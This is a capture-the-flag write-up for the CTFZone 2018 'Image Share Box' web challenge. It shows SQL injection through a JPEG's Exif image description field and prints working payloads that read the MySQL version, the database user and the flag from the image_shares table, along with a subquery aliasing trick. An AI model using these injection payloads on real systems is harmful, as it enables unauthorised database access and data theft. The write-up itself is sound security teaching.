CTFZone Quals 2018 - Image Share Box
-------------------------
**Category:** Web

**Points:** 500 (Dynamic scoring)

##### Description:
```
We created a new cool service that allows you to share your images with everyone (it's on beta now)! The only thing you need to share something is an Image Description!Happy sharing!
https://img.ctf.bz/
```

When visiting the page, you're prompted to login with credentials or login via Dropbox, I didn't know any creds or see a sign-up page so I logged in using dropbox.

After logging in with Dropbox the App will create a folder inside your Dropbox account where you can put images to select to upload.

Reading the description has one important hint “The only thing you need to share something is an Image Description!”, this immediately stood out to me as something to do with Exif data especially because it was limited to jpg/jpeg files. 

So first things first, I tried to upload the standard jpg file which returned an error saying the image needed a description, next I opened up and Exif Data editor and set the image description to ``nunya'<test>"--#``, when uploading this we get prompted with a MySQL error encoded in Base64 which in plaintext says
```
(_mysql_exceptions.ProgrammingError) (1064, 'You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near \'"--#\', \'https://www.dropbox.com/s/k07i4e1c5ls7uf5/me_jpeg.jpg?dl=0&raw=1\', \'0\')\' at line 1') [SQL: 'INSERT INTO `image_shares` (`owner`, `description`, `image_link`, `approved`) VALUES (\'dbid:AAD0ZsS7O2WbE34VnvOap65jluDGEyVUlxM\', \'nunya\'<test>"--#\', \'https://www.dropbox.com/s/k07i4e1c5ls7uf5/me_jpeg.jpg?dl=0&raw=1\', \'0\')'] (Background on this error at: http://sqlalche.me/e/f405)
```
So from this, we can see we can do SQL injection through the image description, next to verify the vulnerability I used the following to payloads to get the MySQL version and the user.
``test',(select version()),'0');# -> 5.7.22``
``test',(select user()),'0');# -> root@100.107.212.10``

After this I went down a massive rabbit whole trying to find credentials in the database to login to and get the flag, eventually I gave up and tried to see if I could find the flag in the description of the images, after trying to use wildcards and failing I decided to see if it was just stored for the first ID in the database.

Using the payload ``test',(SELECT GROUP_CONCAT(owner,0x3a,description) FROM image_shares AS a WHERE id="1"),'0');#`` which gets us the flag ``dbid:736b6e6f5070336f26696e6c2b6f657651657a75:ctfzone{b4827d53d3faa0b3d6f20d73df5e280f}``

Note: I had to use the “table_name AS a” trick to bypass the MySQL error for querying the same table in a subquery (got stuck big time on this)
